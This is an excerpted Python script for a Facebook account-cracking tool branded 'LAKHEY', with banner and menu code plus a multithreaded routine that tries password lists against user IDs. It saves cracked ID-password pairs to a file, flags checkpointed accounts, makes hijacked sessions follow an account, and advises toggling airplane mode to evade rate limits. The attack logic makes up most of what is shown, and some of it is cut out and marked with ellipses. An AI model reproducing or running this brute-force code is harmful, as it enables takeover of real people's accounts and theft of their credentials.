...
| $$ /$$__  $$| $$_  $$ | $$  | $$| $$_____/| $$  | $$
| $$|  $$$$$$$| $$ \  $$| $$  | $$|  $$$$$$$|  $$$$$$$
|__/ \_______/|__/  \__/|__/  |__/ \_______/ \____  $$
                                             /$$  | $$
                                            |  $$$$$$/
                                             \______/ '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t            Grey Hat Hacker  : [green]LAKHEY[purple] '))
		...
		print(f'  {u}[{h}•{u}]{h} LOGIN SUCCESSFUL.........PLZ RUN THE PROGRAM AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tWelcome [green]%s[purple] to LAKHEY EMULATOR'%(my_name)))
	alvino_xy(f'{u}ID  : '+str(my_id))
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]           • CHOOSE WHAT YOU WANT • [/bold cyan]'))
	print('')
...
def setting():
	...
	print('') 
	cetak(nel('[bold yellow]🇮🇩➣1. Old Account\n🇮🇩➣2. New Account\n🇮🇩➣3. Random [bold yellow]'))
	print('')
	hu = input('➥➥➣select : ')
	if hu in ['1','01']:
		...
		print('➥➥➣Select Yang Bener Kontooll ')
		exit()
	cetak(nel('\t[bold cyan]             • LOGIN METODE • [/bold cyan]'))
	print('') 
	cetak(nel('[bold purple]🇮🇩➣1. Mobile(Highly Recommended)\n🇮🇩➣2. Mbasic(Recommended)\n🇮🇩➣3. Touch\n🇮🇩➣4. Mtouch [bold purple]')) 
	print('')
	hc = input('>> Select : ')
	if hc in ['1','01']:
...
def passwrd():
	...
	print('')
	print(f'➥➥➣Result {h}OK{u} Saved In : {h}OK/%s {b}'%(okc))
	print(f'➥➥➣Result {k}CP{h} Saved In : {k}CP/%s {b}'%(cpc))
	print(f'➥➥➣Play Airplane Mode Every {h}1k{u} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple]➥➥➣[green]Crack Done Dont Forget to Be Thankful [purple] <<[yellow] '))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [LAKHEY-CP] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [LAKHEY-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/LAKHEY-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
